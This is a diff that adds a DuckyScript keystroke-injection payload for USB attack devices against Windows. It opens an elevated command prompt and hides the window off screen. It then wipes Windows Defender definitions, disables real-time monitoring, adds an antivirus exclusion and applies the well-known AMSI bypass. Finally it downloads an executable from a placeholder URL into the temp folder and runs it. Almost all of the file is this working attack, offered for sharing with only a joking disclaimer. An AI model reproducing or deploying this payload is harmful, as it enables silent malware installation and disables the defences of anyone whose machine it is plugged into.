@@ -1,0 +1,68 @@
+REM Author: Quessts
+REM The following script downloads and runs
+REM executable files from the internet
+REM replace <File Name> with the name of the exe
+REM and replace <URl> with the URL link
+REM this script also bypasses AntiVirus and
+REM adds the file to the exclusions list
+REM please give credit when sharing this script
+REM and don't use it for evil :)
+
+
+
+REM Three second delay before start
+DELAY 3000
+REM search for cmd
+GUI r
+DELAY 100
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+REM Launch cmd as admin
+ALT y
+DELAY 2000
+STRING cd %userprofile%
+ENTER
+DELAY 100
+REM Hide screen
+ALT SPACE 
+DELAY 1000
+STRING m 
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+REM Disable antivirus
+STRING "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+ENTER
+DELAY 100
+REM start powershell
+STRING powershell
+ENTER
+DELAY 500
+REM Add file to exclusions
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "$env:TEMP/<File Name>"
+ENTER
+DELAY 100
+STRING "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+ENTER
+DELAY 100
+REM Download file from URL and save to temp
+STRING Invoke-WebRequest -Uri '<URL LINK>' -OutFile $env:TEMP/<File Name>
+ENTER
+DELAY 750
+REM Change directory to temp
+STRING cd $env:TEMP
+ENTER
+DELAY 100
+REM Run file
+STRING .\Client-built.exe
+ENTER
+DELAY 100
+
+REM Exit powershell and cmd
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
